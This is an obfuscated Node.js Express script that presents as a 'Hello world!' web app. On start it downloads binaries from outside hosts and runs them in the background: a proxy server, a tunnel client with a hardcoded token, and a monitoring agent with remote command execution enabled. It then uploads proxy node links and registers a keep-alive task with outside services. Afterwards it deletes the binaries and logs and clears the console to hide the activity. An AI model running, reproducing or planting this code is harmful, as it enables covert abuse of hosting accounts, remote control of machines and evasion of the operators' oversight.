const _0x465503=_0x35ab;(function(_0x1168e3,_0x3790a4){const _0x5b8b1d=_0x35ab,_0x635fd8=_0x1168e3();while(!![]){try{const _0x13b1f2=-parseInt(_0x5b8b1d(0x24b))/0x1+-parseInt(_0x5b8b1d(0x1f4))/0x2*(-parseInt(_0x5b8b1d(0x28d))/0x3)+parseInt(_0x5b8b1d(0x2aa))/0x4+parseInt(_0x5b8b1d(0x21f))/0x5+-parseInt(_0x5b8b1d(0x299))/0x6*(-parseInt(_0x5b8b1d(0x2a4))/0x7)+-parseInt(_0x5b8b1d(0x296))/0x8+parseInt(_0x5b8b1d(0x263))/0x9*(-parseInt(_0x5b8b1d(0x236))/0xa);if(_0x13b1f2===_0x3790a4)break;else _0x635fd8['push'](_0x635fd8['shift']());}catch(_0x378e79){_0x635fd8['push'](_0x635fd8['shift']());}}}(_0x52e9,0x542d5));const express=require('express'),app=express(),axios=require(_0x465503(0x29a)),os=require('os'),fs=require('fs'),path=require(_0x465503(0x2a3)),{promisify}=require(_0x465503(0x249)),exec=promisify(require('child_process')[_0x465503(0x20c)]),{execSync}=require(_0x465503(0x247)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x465503(0x251)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x465503(0x251)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||_0x465503(0x27b),SUB_PATH=process[_0x465503(0x251)]['SUB_PATH']||_0x465503(0x267),PORT=process[_0x465503(0x251)]['SERVER_PORT']||process[_0x465503(0x251)][_0x465503(0x1f2)]||0xbb8,UUID=process['env'][_0x465503(0x2a5)]||_0x465503(0x266),YOUNGHERO_SERVER=process[_0x465503(0x251)][_0x465503(0x23c)]||_0x465503(0x201),YOUNGHERO_PORT=process[_0x465503(0x251)]['YOUNGHERO_PORT']||'',YOUNGHERO_KEY=process['env'][_0x465503(0x225)]||_0x465503(0x297),SUIDAO_DOMAIN=process[_0x465503(0x251)][_0x465503(0x228)]||'shiper.kaixa.xx.kg',SUIDAO_AUTH=process[_0x465503(0x251)][_0x465503(0x253)]||_0x465503(0x223),SUIDAO_PORT=process[_0x465503(0x251)][_0x465503(0x278)]||0x1f41,CFIP=process[_0x465503(0x251)][_0x465503(0x27c)]||_0x465503(0x26a),CFPORT=process['env'][_0x465503(0x292)]||0x1bb,NAME=process['env'][_0x465503(0x235)]||'Vls';!fs['existsSync'](FILE_PATH)?(fs[_0x465503(0x25b)](FILE_PATH),console[_0x465503(0x213)](FILE_PATH+_0x465503(0x279))):console[_0x465503(0x213)](FILE_PATH+_0x465503(0x24d));let npmPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x276)),phpPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x26d)),webPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x1fe)),botPath=path['join'](FILE_PATH,_0x465503(0x23e)),subPath=path[_0x465503(0x284)](FILE_PATH,'sub.txt'),listPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x288)),bootLogPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x275)),configPath=path[_0x465503(0x284)](FILE_PATH,_0x465503(0x21d));function deleteNodes(){const _0xd51973=_0x465503;try{if(!UPLOAD_URL)return;if(!fs[_0xd51973(0x246)](subPath))return;let _0x369145;try{_0x369145=fs[_0xd51973(0x1f9)](subPath,'utf-8');}catch{return null;}const _0x472dc7=Buffer[_0xd51973(0x26f)](_0x369145,_0xd51973(0x27a))[_0xd51973(0x2a6)](_0xd51973(0x268)),_0x1f8ea1=_0x472dc7[_0xd51973(0x222)]('\x0a')['filter'](_0x576047=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd51973(0x29d)](_0x576047));if(_0x1f8ea1['length']===0x0)return;return axios[_0xd51973(0x287)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x1f8ea1}),{'headers':{'Content-Type':_0xd51973(0x26e)}})[_0xd51973(0x241)](_0x503d36=>{return null;});}catch(_0x22a462){return null;}}function cleanupOldFiles(){const _0x13056a=_0x465503,_0x1d5916=[_0x13056a(0x1fe),_0x13056a(0x23e),_0x13056a(0x276),_0x13056a(0x26d),_0x13056a(0x212),_0x13056a(0x275)];_0x1d5916['forEach'](_0x919656=>{const _0x25d2a7=_0x13056a,_0x452f7b=path[_0x25d2a7(0x284)](FILE_PATH,_0x919656);fs['unlink'](_0x452f7b,()=>{});});}app[_0x465503(0x204)]('/',function(_0x58ba27,_0x1b833b){const _0x4925ca=_0x465503;_0x1b833b['send'](_0x4925ca(0x240));});const config={'log':{'access':_0x465503(0x277),'error':_0x465503(0x277),'loglevel':_0x465503(0x205)},'inbounds':[{'port':SUIDAO_PORT,'protocol':_0x465503(0x200),'settings':{'clients':[{'id':UUID,'flow':_0x465503(0x22d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-suidao','dest':0xbba},{'path':_0x465503(0x257),'dest':0xbbb},{'path':_0x465503(0x272),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x465503(0x200),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x465503(0x229),'security':_0x465503(0x205)}},{'port':0xbba,'listen':_0x465503(0x202),'protocol':_0x465503(0x200),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x465503(0x205)},'streamSettings':{'network':'ws','security':_0x465503(0x205),'wsSettings':{'path':_0x465503(0x23a)}},'sniffing':{'enabled':!![],'destOverride':[_0x465503(0x234),_0x465503(0x21b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x465503(0x202),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x465503(0x257)}},'sniffing':{'enabled':!![],'destOverride':[_0x465503(0x234),_0x465503(0x21b),_0x465503(0x286)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x465503(0x202),'protocol':_0x465503(0x25a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x465503(0x205),'wsSettings':{'path':_0x465503(0x272)}},'sniffing':{'enabled':!![],'destOverride':[_0x465503(0x234),_0x465503(0x21b),_0x465503(0x286)],'metadataOnly':![]}}],'dns':{'servers':[_0x465503(0x273)]},'outbounds':[{'protocol':_0x465503(0x29c),'tag':_0x465503(0x26c)},{'protocol':_0x465503(0x255),'tag':_0x465503(0x298)}]};function _0x52e9(){const _0x2eee2c=['2135960PCdRUS','/npm\x20-s\x20','https://amd64.ssss.nyc.mn/agent','data','/vless-suidao','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','YOUNGHERO_SERVER','YOUNGHERO\x20variable\x20is\x20empty,skip\x20running','bot','SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain','Hello\x20world!','catch','createWriteStream','writeFileSync','php\x20is\x20running','arm64','existsSync','child_process','2096','util','./web','559351GsIJwL','./php','\x20already\x20exists','listen','chmod','&type=ws&host=','env','App\x20is\x20running','SUIDAO_AUTH','\x0a\x20\x20\x0avmess://','blackhole','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','/vmess-suidao','Empowerment\x20failed\x20for\x20','Content-Type','trojan','mkdirSync','stream','length','message','8443','/web\x20-c\x20','arch','\x0a\x20\x20credentials-file:\x20','18lTljgq','web\x20is\x20running','https://amd64.ssss.nyc.mn/2go','6fe3a8fb-1b5e-4b5f-87c5-0f61e733337d','sub','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','www.visa.com.sg','https://oooo.serv00.net/add-url','direct','php','application/json','from','TunnelSecret','/api/add-subscriptions','/trojan-suidao','https+local://8.8.8.8/dns-query','false','boot.log','npm','/dev/null','SUIDAO_PORT','\x20is\x20created','base64','./tmp','CFIP','https://amd64.ssss.nyc.mn/web','Failed\x20to\x20add\x20URL:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/2go','forEach','npm\x20is\x20running','/sub.txt\x20saved\x20successfully','join','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','quic','post','list.txt','Skipping\x20adding\x20automatic\x20access\x20task','https://amd64.ssss.nyc.mn/v1','./npm','2083','27gtembo','map','Empowerment\x20success\x20for\x20','Subscription\x20uploaded\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','CFPORT','&path=%2Fvless-suidao%3Fed%3D2560#','unshift','Error\x20downloading\x20files:','1041984spobEj','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','block','30trvgai','axios','stringify','freedom','test','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2053','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20reading\x20boot.log:','\x20-p\x20','path','778421LYAsFI','UUID','toString','/bot\x20','tunnel.json','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','923168MALITP','then','SuidaoDomain:','aarch64','PORT','https://arm64.ssss.nyc.mn/web','93298BzBxee','nohup\x20','?security=tls&sni=','http\x20server\x20is\x20running\x20on\x20port:','push','readFileSync','2087','error','Download\x20','\x20failed:\x20','web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','vless','nzag.faiz.us.kg:8008','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','get','none','npm\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20tunnel:\x20','fileUrl','automatic\x20access\x20task\x20added\x20successfully','match','exec','close','https://arm64.ssss.nyc.mn/v1','./bot','\x0aclient_secret:\x20','includes','sub.txt','log','Error\x20executing\x20command:\x20','https://arm64.ssss.nyc.mn/agent','unlinkSync','tunnel.yml','443','?encryption=none&security=tls&sni=','fileName','tls','pop','config.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','1274660uZbppZ','arm','filter','split','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiZGFiNWU2MzgtMjcwZS00ZmI3LTk4MmYtOTkwODI1MGE4OTUwIiwicyI6IlltVmhPREV6WVRBdE4yRmxNaTAwWW1JekxXRmhZVGN0TUdZeFlXWTFaRGd6TnprdyJ9','status','YOUNGHERO_KEY','--tls','amd','SUIDAO_DOMAIN','tcp','response','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','all','xtls-rprx-vision','/tunnel.yml\x20run','/php\x20-c\x20\x22','set','php\x20running\x20error:\x20','&path=%2Ftrojan-suidao%3Fed%3D2560#','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','http','NAME'];_0x52e9=function(){return _0x2eee2c;};return _0x52e9();}fs[_0x465503(0x243)](path[_0x465503(0x284)](FILE_PATH,_0x465503(0x21d)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x42b042=_0x465503,_0x1cfc4d=os[_0x42b042(0x261)]();return _0x1cfc4d===_0x42b042(0x220)||_0x1cfc4d===_0x42b042(0x245)||_0x1cfc4d===_0x42b042(0x2ad)?_0x42b042(0x220):_0x42b042(0x227);}function downloadFile(_0x1ed234,_0x583770,_0x1d4cc1){const _0x13ecc1=_0x465503,_0x1b9097=path[_0x13ecc1(0x284)](FILE_PATH,_0x1ed234),_0x5b90fe=fs[_0x13ecc1(0x242)](_0x1b9097);axios({'method':_0x13ecc1(0x204),'url':_0x583770,'responseType':_0x13ecc1(0x25c)})[_0x13ecc1(0x2ab)](_0x5aa6a9=>{const _0x5cd5bd=_0x13ecc1;_0x5aa6a9[_0x5cd5bd(0x239)]['pipe'](_0x5b90fe),_0x5b90fe['on']('finish',()=>{const _0x21cb3c=_0x5cd5bd;_0x5b90fe[_0x21cb3c(0x20d)](),console[_0x21cb3c(0x213)](_0x21cb3c(0x1fc)+_0x1ed234+'\x20successfully'),_0x1d4cc1(null,_0x1ed234);}),_0x5b90fe['on']('error',_0x5b6490=>{const _0x61c0b3=_0x5cd5bd;fs['unlink'](_0x1b9097,()=>{});const _0x5639b1='Download\x20'+_0x1ed234+'\x20failed:\x20'+_0x5b6490[_0x61c0b3(0x25e)];console[_0x61c0b3(0x1fb)](_0x5639b1),_0x1d4cc1(_0x5639b1);});})[_0x13ecc1(0x241)](_0xd076ec=>{const _0x37e4c7=_0x13ecc1,_0x59ad41=_0x37e4c7(0x1fc)+_0x1ed234+_0x37e4c7(0x1fd)+_0xd076ec[_0x37e4c7(0x25e)];console['error'](_0x59ad41),_0x1d4cc1(_0x59ad41);});}async function downloadFilesAndRun(){const _0x1d2d1e=_0x465503,_0x44bb55=getSystemArchitecture(),_0x26495c=getFilesForArchitecture(_0x44bb55);if(_0x26495c[_0x1d2d1e(0x25d)]===0x0){console[_0x1d2d1e(0x213)](_0x1d2d1e(0x2a9));return;}const _0x34e4a5=_0x26495c[_0x1d2d1e(0x28e)](_0xa954e7=>{return new Promise((_0x19624d,_0xc2258a)=>{const _0x6ad4a3=_0x35ab;downloadFile(_0xa954e7[_0x6ad4a3(0x21a)],_0xa954e7[_0x6ad4a3(0x209)],(_0x2436d7,_0x404ed0)=>{_0x2436d7?_0xc2258a(_0x2436d7):_0x19624d(_0x404ed0);});});});try{await Promise[_0x1d2d1e(0x22c)](_0x34e4a5);}catch(_0x629ba7){console[_0x1d2d1e(0x1fb)](_0x1d2d1e(0x295),_0x629ba7);return;}function _0x2ffa26(_0x112c31){const _0x4ed325=_0x1d2d1e,_0x2ec585=0x1fd;_0x112c31[_0x4ed325(0x281)](_0x2f3ff5=>{const _0x980d87=_0x4ed325,_0x211ff9=path[_0x980d87(0x284)](FILE_PATH,_0x2f3ff5);fs['existsSync'](_0x211ff9)&&fs[_0x980d87(0x24f)](_0x211ff9,_0x2ec585,_0x2df076=>{const _0x2ca3f1=_0x980d87;_0x2df076?console[_0x2ca3f1(0x1fb)](_0x2ca3f1(0x258)+_0x211ff9+':\x20'+_0x2df076):console[_0x2ca3f1(0x213)](_0x2ca3f1(0x28f)+_0x211ff9+':\x20'+_0x2ec585['toString'](0x8));});});}const _0x2fd2f7=YOUNGHERO_PORT?[_0x1d2d1e(0x28b),_0x1d2d1e(0x24a),_0x1d2d1e(0x20f)]:[_0x1d2d1e(0x24c),_0x1d2d1e(0x24a),_0x1d2d1e(0x20f)];_0x2ffa26(_0x2fd2f7);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x66a471=YOUNGHERO_SERVER[_0x1d2d1e(0x211)](':')?YOUNGHERO_SERVER['split'](':')[_0x1d2d1e(0x21c)]():'',_0xf51677=new Set(['443','8443',_0x1d2d1e(0x248),'2087',_0x1d2d1e(0x28c),_0x1d2d1e(0x29f)]),_0x1e51a3=_0xf51677['has'](_0x66a471)?'true':_0x1d2d1e(0x274),_0x2debc6=_0x1d2d1e(0x210)+YOUNGHERO_KEY+_0x1d2d1e(0x291)+YOUNGHERO_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x1e51a3+_0x1d2d1e(0x29e)+UUID;fs['writeFileSync'](path[_0x1d2d1e(0x284)](FILE_PATH,'config.yaml'),_0x2debc6);const _0x8b836e=_0x1d2d1e(0x1f5)+FILE_PATH+_0x1d2d1e(0x22f)+FILE_PATH+_0x1d2d1e(0x27f);try{await exec(_0x8b836e),console[_0x1d2d1e(0x213)](_0x1d2d1e(0x244)),await new Promise(_0xd63501=>setTimeout(_0xd63501,0x3e8));}catch(_0x2e4e7d){console['error'](_0x1d2d1e(0x231)+_0x2e4e7d);}}else{let _0x3cfc6c='';const _0x242570=[_0x1d2d1e(0x218),_0x1d2d1e(0x25f),_0x1d2d1e(0x248),_0x1d2d1e(0x1fa),_0x1d2d1e(0x28c),_0x1d2d1e(0x29f)];_0x242570['includes'](YOUNGHERO_PORT)&&(_0x3cfc6c=_0x1d2d1e(0x226));const _0x3026e8=_0x1d2d1e(0x1f5)+FILE_PATH+_0x1d2d1e(0x237)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x1d2d1e(0x2a2)+YOUNGHERO_KEY+'\x20'+_0x3cfc6c+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3026e8),console['log'](_0x1d2d1e(0x282)),await new Promise(_0x366ec6=>setTimeout(_0x366ec6,0x3e8));}catch(_0x1e2789){console[_0x1d2d1e(0x1fb)](_0x1d2d1e(0x206)+_0x1e2789);}}}else console[_0x1d2d1e(0x213)](_0x1d2d1e(0x23d));const _0x1b9c6e=_0x1d2d1e(0x1f5)+FILE_PATH+_0x1d2d1e(0x260)+FILE_PATH+_0x1d2d1e(0x2a0);try{await exec(_0x1b9c6e),console[_0x1d2d1e(0x213)](_0x1d2d1e(0x264)),await new Promise(_0xb82f66=>setTimeout(_0xb82f66,0x3e8));}catch(_0x2d6aa0){console['error']('web\x20running\x20error:\x20'+_0x2d6aa0);}if(fs[_0x1d2d1e(0x246)](path[_0x1d2d1e(0x284)](FILE_PATH,_0x1d2d1e(0x23e)))){let _0x1556e0;if(SUIDAO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1556e0=_0x1d2d1e(0x269)+SUIDAO_AUTH;else SUIDAO_AUTH['match'](/TunnelSecret/)?_0x1556e0=_0x1d2d1e(0x207)+FILE_PATH+_0x1d2d1e(0x22e):_0x1556e0=_0x1d2d1e(0x1ff)+FILE_PATH+_0x1d2d1e(0x285)+SUIDAO_PORT;try{await exec(_0x1d2d1e(0x1f5)+FILE_PATH+_0x1d2d1e(0x2a7)+_0x1556e0+'\x20>/dev/null\x202>&1\x20&'),console[_0x1d2d1e(0x213)]('bot\x20is\x20running'),await new Promise(_0x218507=>setTimeout(_0x218507,0x7d0));}catch(_0x201ce3){console[_0x1d2d1e(0x1fb)]('Error\x20executing\x20command:\x20'+_0x201ce3);}}await new Promise(_0x1740cd=>setTimeout(_0x1740cd,0x1388));}function getFilesForArchitecture(_0x4b5830){const _0x19dc9f=_0x465503;let _0x2e375b;_0x4b5830===_0x19dc9f(0x220)?_0x2e375b=[{'fileName':_0x19dc9f(0x1fe),'fileUrl':_0x19dc9f(0x1f3)},{'fileName':_0x19dc9f(0x23e),'fileUrl':_0x19dc9f(0x280)}]:_0x2e375b=[{'fileName':_0x19dc9f(0x1fe),'fileUrl':_0x19dc9f(0x27d)},{'fileName':'bot','fileUrl':_0x19dc9f(0x265)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x15208a=_0x4b5830===_0x19dc9f(0x220)?_0x19dc9f(0x215):_0x19dc9f(0x238);_0x2e375b['unshift']({'fileName':_0x19dc9f(0x276),'fileUrl':_0x15208a});}else{const _0x4858d9=_0x4b5830===_0x19dc9f(0x220)?_0x19dc9f(0x20e):_0x19dc9f(0x28a);_0x2e375b[_0x19dc9f(0x294)]({'fileName':_0x19dc9f(0x26d),'fileUrl':_0x4858d9});}}return _0x2e375b;}function suidaoType(){const _0x1d9be2=_0x465503;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x1d9be2(0x213)]('SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(SUIDAO_AUTH[_0x1d9be2(0x211)](_0x1d9be2(0x270))){fs[_0x1d9be2(0x243)](path[_0x1d9be2(0x284)](FILE_PATH,_0x1d9be2(0x2a8)),SUIDAO_AUTH);const _0x43284e=_0x1d9be2(0x208)+SUIDAO_AUTH['split']('\x22')[0xb]+_0x1d9be2(0x262)+path[_0x1d9be2(0x284)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+SUIDAO_DOMAIN+_0x1d9be2(0x21e)+SUIDAO_PORT+_0x1d9be2(0x203);fs[_0x1d9be2(0x243)](path[_0x1d9be2(0x284)](FILE_PATH,_0x1d9be2(0x217)),_0x43284e);}else console[_0x1d9be2(0x213)](_0x1d9be2(0x22b));}suidaoType();async function extractDomains(){const _0x13730c=_0x465503;let _0x781b94;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x781b94=SUIDAO_DOMAIN,console[_0x13730c(0x213)]('SUIDAO_DOMAIN:',_0x781b94),await _0x5f1f57(_0x781b94);else try{const _0x5d1f78=fs[_0x13730c(0x1f9)](path[_0x13730c(0x284)](FILE_PATH,_0x13730c(0x275)),_0x13730c(0x268)),_0x30c898=_0x5d1f78[_0x13730c(0x222)]('\x0a'),_0x419377=[];_0x30c898['forEach'](_0x54473e=>{const _0x43f760=_0x13730c,_0xc3b703=_0x54473e[_0x43f760(0x20b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xc3b703){const _0x2e2df9=_0xc3b703[0x1];_0x419377['push'](_0x2e2df9);}});if(_0x419377[_0x13730c(0x25d)]>0x0)_0x781b94=_0x419377[0x0],console[_0x13730c(0x213)](_0x13730c(0x2ac),_0x781b94),await _0x5f1f57(_0x781b94);else{console[_0x13730c(0x213)](_0x13730c(0x23f)),fs[_0x13730c(0x216)](path['join'](FILE_PATH,_0x13730c(0x275)));async function _0x16a880(){const _0x4619ab=_0x13730c;try{await exec(_0x4619ab(0x256));}catch(_0x1725fa){}}_0x16a880(),await new Promise(_0x5566b9=>setTimeout(_0x5566b9,0xbb8));const _0x5bef56=_0x13730c(0x1ff)+FILE_PATH+_0x13730c(0x285)+SUIDAO_PORT;try{await exec(_0x13730c(0x1f5)+path['join'](FILE_PATH,_0x13730c(0x23e))+'\x20'+_0x5bef56+'\x20>/dev/null\x202>&1\x20&'),console[_0x13730c(0x213)]('bot\x20is\x20running.'),await new Promise(_0x2bd46e=>setTimeout(_0x2bd46e,0xbb8)),await extractDomains();}catch(_0xe9bd5a){console[_0x13730c(0x1fb)](_0x13730c(0x214)+_0xe9bd5a);}}}catch(_0x5cf383){console[_0x13730c(0x1fb)](_0x13730c(0x2a1),_0x5cf383);}async function _0x5f1f57(_0x292628){const _0x108bb9=_0x13730c,_0x468308=execSync(_0x108bb9(0x233),{'encoding':_0x108bb9(0x268)}),_0x502438=_0x468308['trim']();return new Promise(_0x5a6708=>{setTimeout(()=>{const _0x128c1a=_0x35ab,_0x48e4ab={'v':'2','ps':NAME+'-'+_0x502438,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x128c1a(0x205),'net':'ws','type':_0x128c1a(0x205),'host':_0x292628,'path':'/vmess-suidao?ed=2560','tls':_0x128c1a(0x21b),'sni':_0x292628,'alpn':''},_0x571c29='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x128c1a(0x219)+_0x292628+_0x128c1a(0x250)+_0x292628+_0x128c1a(0x293)+NAME+'-'+_0x502438+_0x128c1a(0x254)+Buffer['from'](JSON[_0x128c1a(0x29b)](_0x48e4ab))[_0x128c1a(0x2a6)](_0x128c1a(0x27a))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x128c1a(0x1f6)+_0x292628+_0x128c1a(0x250)+_0x292628+_0x128c1a(0x232)+NAME+'-'+_0x502438+'\x0a\x20\x20\x20\x20';console[_0x128c1a(0x213)](Buffer['from'](_0x571c29)[_0x128c1a(0x2a6)](_0x128c1a(0x27a))),fs[_0x128c1a(0x243)](subPath,Buffer['from'](_0x571c29)['toString'](_0x128c1a(0x27a))),console[_0x128c1a(0x213)](FILE_PATH+_0x128c1a(0x283)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x5c3418,_0x407f5a)=>{const _0xd9eb6e=_0x128c1a,_0x4799ca=Buffer[_0xd9eb6e(0x26f)](_0x571c29)[_0xd9eb6e(0x2a6)](_0xd9eb6e(0x27a));_0x407f5a[_0xd9eb6e(0x230)](_0xd9eb6e(0x259),'text/plain;\x20charset=utf-8'),_0x407f5a['send'](_0x4799ca);}),_0x5a6708(_0x571c29);},0x7d0);});}}async function uplodNodes(){const _0x48d87e=_0x465503;if(UPLOAD_URL&&PROJECT_URL){const _0xfc978=PROJECT_URL+'/'+SUB_PATH,_0x1c112f={'subscription':[_0xfc978]};try{const _0xa83c7a=await axios[_0x48d87e(0x287)](UPLOAD_URL+_0x48d87e(0x271),_0x1c112f,{'headers':{'Content-Type':_0x48d87e(0x26e)}});if(_0xa83c7a[_0x48d87e(0x224)]===0xc8)console[_0x48d87e(0x213)](_0x48d87e(0x290));else return null;}catch(_0x1d4e5b){if(_0x1d4e5b['response']){if(_0x1d4e5b[_0x48d87e(0x22a)][_0x48d87e(0x224)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x48d87e(0x246)](listPath))return;const _0x21d347=fs[_0x48d87e(0x1f9)](listPath,_0x48d87e(0x268)),_0x173789=_0x21d347['split']('\x0a')[_0x48d87e(0x221)](_0x1cf927=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1cf927));if(_0x173789[_0x48d87e(0x25d)]===0x0)return;const _0x4deb06=JSON[_0x48d87e(0x29b)]({'nodes':_0x173789});try{await axios[_0x48d87e(0x287)](UPLOAD_URL+'/api/add-nodes',_0x4deb06,{'headers':{'Content-Type':_0x48d87e(0x26e)}});if(response[_0x48d87e(0x224)]===0xc8)console[_0x48d87e(0x213)](_0x48d87e(0x290));else return null;}catch(_0x34997e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x204477=_0x35ab,_0x36a808=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x36a808[_0x204477(0x1f8)](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x36a808[_0x204477(0x1f8)](phpPath);exec('rm\x20-rf\x20'+_0x36a808[_0x204477(0x284)]('\x20')+'\x20>/dev/null\x202>&1',_0x274405=>{const _0x451948=_0x204477;console['clear'](),console[_0x451948(0x213)](_0x451948(0x252)),console[_0x451948(0x213)](_0x451948(0x23b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x398571=_0x465503;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x398571(0x289));return;}try{const _0x1d03c9=await axios[_0x398571(0x287)](_0x398571(0x26b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x398571(0x26e)}});console['log'](_0x398571(0x20a));}catch(_0x452f1c){console['error'](_0x398571(0x27e)+_0x452f1c['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}function _0x35ab(_0x29d572,_0x5bd043){const _0x52e956=_0x52e9();return _0x35ab=function(_0x35ab17,_0x9e1dbf){_0x35ab17=_0x35ab17-0x1f2;let _0x2053f9=_0x52e956[_0x35ab17];return _0x2053f9;},_0x35ab(_0x29d572,_0x5bd043);}startserver(),app[_0x465503(0x24e)](PORT,()=>console[_0x465503(0x213)](_0x465503(0x1f7)+PORT+'!'));
